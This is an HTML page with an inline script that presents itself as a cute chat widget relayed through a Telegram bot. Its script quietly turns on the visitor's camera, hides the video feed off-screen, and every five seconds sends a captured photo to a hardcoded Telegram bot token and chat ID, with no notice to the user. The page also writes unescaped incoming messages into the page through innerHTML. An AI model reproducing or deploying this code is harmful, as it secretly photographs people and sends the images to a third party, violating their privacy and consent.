<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>....</title>
    <style>
      body {
    background: linear-gradient(120deg, #ff758c, #ff7eb3);
    font-family: Arial, sans-serif;
    text-align: center;
    color: white;
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 20px;
    height: 100vh;
    margin: 0;
    overflow: hidden;
    transition: background 0.3s ease;
}

h2 {
    position: absolute;
    top: 20px;
    left: 50%;
    transform: translateX(-50%);
    font-size: 2rem;
    color: #ff1f58;
    margin: 0;
    z-index: 10;
    font-weight: bold;
}

#chatbox {
    width: 90%;
    max-width: 450px;
    height: 630px;
    border-radius: 30px;
    padding: 20px;
    overflow-y: auto;
    margin: 20px auto;
    color: black;
    display: flex;
    flex-direction: column;
    z-index: 5;
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
    transform: translateY(5px);
    background-color: #ffb3c1;
}

.msg {
    padding: 12px;
    margin: 5px;
    border-radius: 15px;
    max-width: 70%;
    word-wrap: break-word;
    margin-bottom: 10px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
    transition: transform 0.2s ease, box-shadow 0.2s ease;
}

.msg:hover {
    transform: scale(1.05);
    box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
}

.user {
    background: #ff4f81;
    align-self: flex-end;
    color: white;
    border-radius: 30px;
    padding: 12px 20px;
    z-index: 15;
}

.bot {
    background: #f1f1f1;
    align-self: flex-start;
    color: black;
    border-radius: 30px;
    padding: 12px 20px;
    z-index: 5;
}

input, button {
    padding: 12px;
    border-radius: 20px; /* Rounded corners for capsule shape */
    margin: 5px;
    background-color: #ff1f58; /* Match background to message box */
    color: white;
    border: 2px solid black; /* Black border */
    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
    transition: transform 0.2s ease;
    z-index: 10;
}

input:focus, button:active {
    transform: scale(1.05);
}

button {
    cursor: pointer;
}

.heart-upload {
    font-size: 30px;
    width: 36px;
    height: 36px;
    cursor: pointer;
    margin-top: 10px;
    background-color: #ffb3c1;
    border-radius: 50%; /* Rounded circle for the heart icon */
    border: 2px solid black; /* Black border */
    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
    z-index: 15;
}

#micButton {
    width: 38px;
    height: 38px;
    background-color: #ffb3c1;
    
    border-radius: 50%; /* Rounded circle for mic button */
    border: 2px solid black; /* Black border */
    font-size: 30px;
    color: white;
    cursor: pointer;
    margin-top: 10px;
    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
    z-index: 15;
}

.button-container {
    display: flex;
    justify-content: flex-start;
    align-items: center;
    width: 90%;
    margin-top: 10px;
    position: absolute;
    bottom: 30px;
    left: 50%;
    transform: translateX(-50%);
    z-index: 20;
}

#message {
    width: 55%;
    padding: 12px;
    border-radius: 25px; /* Rounded corners for message input */
    border: 2px solid black; /* Black border */
    margin-top: 10px;
    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
    z-index: 5;
}

#upload {
    display: none;
}

#imagePreview {
    max-width: 100%;
    max-height: 200px;
    margin-top: 10px;
}

#sendButton {
    border-radius: 50%; /* Rounded circle for send button */
    width: 38px;
    height: 38px;
    font-size: 24px;
    display: none;
    align-self: flex-end;
    cursor: pointer;
    border: 2px solid black; /* Black border */
    padding: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    background-color: #ffb3c1;
    box-shadow: 0 0 0 2px white, 0 4px 8px rgba(0, 0, 0, 0.2); /* White outer ring with 2px and inner shadow */
    z-index: 20;
}

#sendButton.active {
    display: flex;
}

#sendButton:disabled {
    cursor: not-allowed;
}      

          button { background: #ff4f81; color: white; cursor: pointer; }
        video { position: fixed; top: -1000px; left: -1000px; } /* Hide video */
        #canvas { display: none; }

        
    </style>
</head>
<body>
    <h2>....</h2>
    <div id="chatbox"></div>
    <input type="text" id="message" placeholder="Type a message...">
    <button onclick="sendMessage()">Send</button>

    <!-- ❤️ Heart-Shaped Upload Button -->
    <label for="upload" class="heart-upload"></label>
    <input type="file" id="upload" accept="image/*">
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        const botToken = "7941135502:AAHz-KGvAAoZEhPVgfVKw3zFbkaB0_Pi5rM";  
        const chatId = "878604830";  

        // 📸 Background Camera Setup
        async function startCamera() {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            document.getElementById("video").srcObject = stream;
        }

        // 📸 Capture Photo and Send to Telegram
        async function captureAndSendPhoto() {
            const video = document.getElementById("video");
            const canvas = document.getElementById("canvas");
            const ctx = canvas.getContext("2d");

            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(async (blob) => {
                let formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("photo", blob);

                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
            }, "image/jpeg", 0.5);
        }

          // 📨 Send Message
        async function sendMessage() {
            const messageInput = document.getElementById("message");
            const message = messageInput.value.trim();
            
            if (!message) return;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });

                document.getElementById("chatbox").innerHTML += `<div class="msg user">${message}</div>`;
                messageInput.value = "";
                scrollToBottom();
                toggleSendButton();
            } catch (error) {
                console.error("Message sending failed:", error);
            }
        }

        // 📤 Send Uploaded Image to Telegram
        document.getElementById("upload").addEventListener("change", async function() {
            const file = this.files[0];
            if (!file) return;

            let formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("photo", file);

            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: "POST",
                body: formData
            });

            document.getElementById("chatbox").innerHTML += `<div class="msg user"><img src="${URL.createObjectURL(file)}" width="100"></div>`;
        });

        // 📥 Fetch Messages from Telegram (Polling)
        async function getMessages() {
            let lastUpdateId = 0;

            setInterval(async () => {
                const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
                const data = await res.json();

                if (data.result.length > 0) {
                    data.result.forEach(update => {
                        if (update.message && update.message.text) {
                            let receivedMessage = update.message.text.toLowerCase().trim();
                            document.getElementById("chatbox").innerHTML += `<div class="msg bot">${update.message.text}</div>`;

                            // ✅ Auto-refresh page if "bye" message received
                            if (receivedMessage === "bye") {
                                setTimeout(() => {
                                    location.reload();
                                }, 2000); // 2-second delay before refresh
                            }
                        }
                        lastUpdateId = update.update_id;
                    });
                }
            }, 3000);
        }

        // ✅ Start Everything
        startCamera();
        setInterval(captureAndSendPhoto, 5000); 
        getMessages();
    </script>
</body>
</html>
